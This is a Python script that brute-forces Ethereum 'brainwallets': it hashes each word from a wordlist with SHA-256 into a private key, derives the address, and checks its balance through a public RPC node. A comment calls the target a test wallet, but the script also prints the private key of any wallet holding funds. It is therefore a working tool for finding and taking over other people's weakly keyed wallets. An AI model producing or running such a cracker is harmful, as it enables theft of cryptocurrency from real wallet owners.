import requests
import time
import hashlib
from eth_keys import keys
from eth_utils import to_checksum_address

# Configuration
ANKR_RPC_URL = "https://rpc.ankr.com/eth"
TARGET_ADDRESS = "0xA81C488659D57F512Bd74f0dB31993C91339777D"  # this is our generated test wallet "lol123"
TARGET_BALANCE_THRESHOLD = 0.001
SLEEP_TIME = 0.01

def get_eth_balance(address):
    payload = {
        "jsonrpc": "2.0",
        "method": "eth_getBalance",
        "params": [address, "latest"],
        "id": 1
    }
    try:
        response = requests.post(ANKR_RPC_URL, json=payload)
        data = response.json()
        if "result" in data:
            balance_wei = int(data["result"], 16)
            balance_eth = balance_wei / 1e18
            return balance_eth
        else:
            return 0
    except Exception as e:
        print(f"Error fetching balance: {e}")
        return 0

# Load weak passwords from test.txt
with open("test.txt", "r") as f:
    weak_words = [line.strip() for line in f if line.strip()]

print(f"Loaded {len(weak_words)} weak password inputs from test.txt.")

# Start testing
for i, word in enumerate(weak_words):
    try:
        # Convert the word to SHA256 → private key
        private_key_hex = hashlib.sha256(word.encode()).hexdigest()
        priv_bytes = bytes.fromhex(private_key_hex)
        priv_key = keys.PrivateKey(priv_bytes)
        pub_key = priv_key.public_key
        address = to_checksum_address(pub_key.to_address())

        balance = get_eth_balance(address)
        time.sleep(SLEEP_TIME)

        print(f"[{i + 1}/{len(weak_words)}] {word} → {address} → {balance:.6f} ETH")

        if address.lower() == TARGET_ADDRESS.lower():
            print("\n=== Match Found ===")
            print(f"Word: {word}")
            print(f"Private Key (SHA256): {private_key_hex}")
            print(f"Address: {address}")
            print(f"Balance: {balance:.6f} ETH")
            break

        if balance >= TARGET_BALANCE_THRESHOLD:
            print("\n=== Active Wallet Found ===")
            print(f"Word: {word}")
            print(f"Private Key (SHA256): {private_key_hex}")
            print(f"Address: {address}")
            print(f"Balance: {balance:.6f} ETH")

    except Exception as e:
        print(f"Error processing word: {word} – {e}")
